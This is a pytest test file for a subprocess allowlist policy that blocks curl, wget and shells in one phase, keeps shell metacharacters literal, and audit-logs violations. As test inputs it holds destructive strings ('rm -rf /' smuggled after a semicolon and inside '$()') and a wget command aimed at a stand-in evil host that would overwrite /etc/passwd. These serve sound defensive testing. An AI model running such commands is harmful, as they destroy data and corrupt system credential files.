"""tests/test_subprocess_policy.py — Unit tests for lib/subprocess_policy.py (US-265).

Run with:  uv run pytest tests/test_subprocess_policy.py -v
"""
from __future__ import annotations

import json
import os
import subprocess
import sys
import tempfile
from pathlib import Path

import pytest

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))
from lib.subprocess_policy import (
    PHASE_COMMAND_ALLOWLIST,
    SubprocessPolicyViolation,
    _log_violation,
    _security_audit_log_path,
    check_command,
    safe_run,
)


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

class _IsolatedScratch:
    """Context manager that redirects the audit log to a temp dir."""

    def __init__(self) -> None:
        self._td: tempfile.TemporaryDirectory[str] | None = None
        self._orig: str | None = None

    def __enter__(self) -> "Path":
        self._td = tempfile.TemporaryDirectory()
        self._orig = os.environ.get("SPIRAL_SCRATCH_DIR")
        os.environ["SPIRAL_SCRATCH_DIR"] = self._td.name
        return Path(self._td.name)

    def __exit__(self, *_: object) -> None:
        if self._orig is None:
            os.environ.pop("SPIRAL_SCRATCH_DIR", None)
        else:
            os.environ["SPIRAL_SCRATCH_DIR"] = self._orig
        if self._td:
            self._td.cleanup()


# ---------------------------------------------------------------------------
# PHASE_COMMAND_ALLOWLIST structure
# ---------------------------------------------------------------------------

class TestAllowlistStructure:
    def test_phase_I_allows_git(self) -> None:
        assert "git" in PHASE_COMMAND_ALLOWLIST["I"]

    def test_phase_I_allows_python(self) -> None:
        assert "python" in PHASE_COMMAND_ALLOWLIST["I"]

    def test_phase_I_allows_node(self) -> None:
        assert "node" in PHASE_COMMAND_ALLOWLIST["I"]

    def test_phase_I_allows_npm(self) -> None:
        assert "npm" in PHASE_COMMAND_ALLOWLIST["I"]

    def test_phase_I_blocks_curl(self) -> None:
        assert "curl" not in PHASE_COMMAND_ALLOWLIST["I"]

    def test_phase_I_blocks_wget(self) -> None:
        assert "wget" not in PHASE_COMMAND_ALLOWLIST["I"]

    def test_phase_I_blocks_bash(self) -> None:
        assert "bash" not in PHASE_COMMAND_ALLOWLIST["I"]

    def test_phase_I_blocks_sh(self) -> None:
        assert "sh" not in PHASE_COMMAND_ALLOWLIST["I"]

    def test_phase_R_allows_curl(self) -> None:
        assert "curl" in PHASE_COMMAND_ALLOWLIST["R"]

    def test_all_phases_present(self) -> None:
        for phase in ("R", "I", "V", "M", "global"):
            assert phase in PHASE_COMMAND_ALLOWLIST

    def test_allowlist_values_are_frozensets(self) -> None:
        for phase, value in PHASE_COMMAND_ALLOWLIST.items():
            assert isinstance(value, frozenset), f"Phase {phase} is not a frozenset"


# ---------------------------------------------------------------------------
# check_command
# ---------------------------------------------------------------------------

class TestCheckCommand:
    def test_allowed_command_passes(self) -> None:
        # Should not raise
        check_command(["git", "commit", "-m", "msg"], phase="I")

    def test_blocked_command_raises(self) -> None:
        with pytest.raises(SubprocessPolicyViolation):
            check_command(["curl", "https://example.com"], phase="I")

    def test_exception_carries_executable(self) -> None:
        with pytest.raises(SubprocessPolicyViolation) as exc_info:
            check_command(["bash", "-c", "echo hi"], phase="I")
        assert exc_info.value.executable == "bash"

    def test_exception_carries_phase(self) -> None:
        with pytest.raises(SubprocessPolicyViolation) as exc_info:
            check_command(["wget", "http://example.com"], phase="I")
        assert exc_info.value.phase == "I"

    def test_exception_carries_cmd(self) -> None:
        cmd = ["bash", "-c", "echo hi"]
        with pytest.raises(SubprocessPolicyViolation) as exc_info:
            check_command(cmd, phase="I")
        assert exc_info.value.cmd == cmd

    def test_path_prefix_stripped(self) -> None:
        """Executable given as absolute path should still be checked by basename."""
        check_command(["/usr/bin/git", "status"], phase="I")  # should pass

    def test_unknown_phase_uses_global(self) -> None:
        # 'global' includes curl; so an unknown phase falls back to global which has curl
        check_command(["curl", "http://example.com"], phase="UNKNOWN_PHASE")

    def test_empty_cmd_raises_value_error(self) -> None:
        with pytest.raises(ValueError):
            check_command([], phase="I")


# ---------------------------------------------------------------------------
# Shell metacharacters are NOT interpreted (shell=False enforced)
# ---------------------------------------------------------------------------

class TestShellMetacharacters:
    """Verify that shell metacharacters in arguments are treated as literals."""

    def test_semicolon_is_literal(self) -> None:
        """'; rm -rf /' in an argument must NOT spawn a shell rm command."""
        result = safe_run(
            ["echo", "hello; rm -rf /"],
            phase="global",
            capture_output=True,
            text=True,
        )
        # 'echo' should output the literal string including the semicolon
        assert ";" in result.stdout
        assert result.returncode == 0

    def test_pipe_is_literal(self) -> None:
        """'|' in an argument must NOT pipe to another command."""
        result = safe_run(
            ["echo", "hello | cat"],
            phase="global",
            capture_output=True,
            text=True,
        )
        assert "|" in result.stdout
        assert result.returncode == 0

    def test_command_substitution_is_literal(self) -> None:
        """'$()' in an argument must NOT execute a command substitution."""
        result = safe_run(
            ["echo", "$(rm -rf /)"],
            phase="global",
            capture_output=True,
            text=True,
        )
        assert "$(" in result.stdout
        assert result.returncode == 0

    def test_backtick_is_literal(self) -> None:
        """Backtick substitution must NOT be executed."""
        result = safe_run(
            ["echo", "`id`"],
            phase="global",
            capture_output=True,
            text=True,
        )
        assert "`" in result.stdout
        assert result.returncode == 0


# ---------------------------------------------------------------------------
# safe_run
# ---------------------------------------------------------------------------

class TestSafeRun:
    def test_executes_allowed_command(self) -> None:
        result = safe_run(
            ["python", "-c", "print('ok')"],
            phase="I",
            capture_output=True,
            text=True,
        )
        assert result.returncode == 0
        assert "ok" in result.stdout

    def test_blocks_disallowed_command(self) -> None:
        with pytest.raises(SubprocessPolicyViolation):
            safe_run(["curl", "http://example.com"], phase="I")

    def test_shell_true_overridden_to_false(self) -> None:
        """Even if caller passes shell=True, safe_run must override to shell=False."""
        # If shell=True were used, "echo hello" as a list would fail differently.
        # With shell=False it should still work since echo is a real command.
        result = safe_run(
            ["echo", "test"],
            phase="global",
            shell=True,  # should be silently overridden
            capture_output=True,
            text=True,
        )
        assert result.returncode == 0

    def test_string_cmd_raises_type_error(self) -> None:
        """Passing a string instead of a list should raise TypeError."""
        with pytest.raises(TypeError):
            safe_run("echo hello", phase="I")  # type: ignore[arg-type]


# ---------------------------------------------------------------------------
# Audit log
# ---------------------------------------------------------------------------

class TestAuditLog:
    def test_violation_logged_to_security_audit(self) -> None:
        with _IsolatedScratch() as scratch:
            with pytest.raises(SubprocessPolicyViolation):
                check_command(["curl", "http://example.com"], phase="I")

            audit_path = Path(scratch) / "security-audit.jsonl"
            assert audit_path.exists(), "security-audit.jsonl was not created"
            entries = [json.loads(line) for line in audit_path.read_text().splitlines()]
            assert len(entries) == 1
            assert entries[0]["event"] == "SubprocessPolicyViolation"
            assert entries[0]["blocked_executable"] == "curl"
            assert entries[0]["phase"] == "I"

    def test_log_includes_timestamp(self) -> None:
        with _IsolatedScratch() as scratch:
            with pytest.raises(SubprocessPolicyViolation):
                check_command(["bash", "-c", "id"], phase="I")
            audit_path = Path(scratch) / "security-audit.jsonl"
            entry = json.loads(audit_path.read_text().splitlines()[0])
            assert "timestamp" in entry

    def test_log_includes_full_command(self) -> None:
        with _IsolatedScratch() as scratch:
            cmd = ["wget", "http://evil.example.com", "--output-document=/etc/passwd"]
            with pytest.raises(SubprocessPolicyViolation):
                check_command(cmd, phase="I")
            audit_path = Path(scratch) / "security-audit.jsonl"
            entry = json.loads(audit_path.read_text().splitlines()[0])
            assert entry["full_command"] == cmd

    def test_multiple_violations_appended(self) -> None:
        with _IsolatedScratch() as scratch:
            for exe in ("curl", "wget"):
                with pytest.raises(SubprocessPolicyViolation):
                    check_command([exe, "http://example.com"], phase="I")
            audit_path = Path(scratch) / "security-audit.jsonl"
            lines = audit_path.read_text().splitlines()
            assert len(lines) == 2
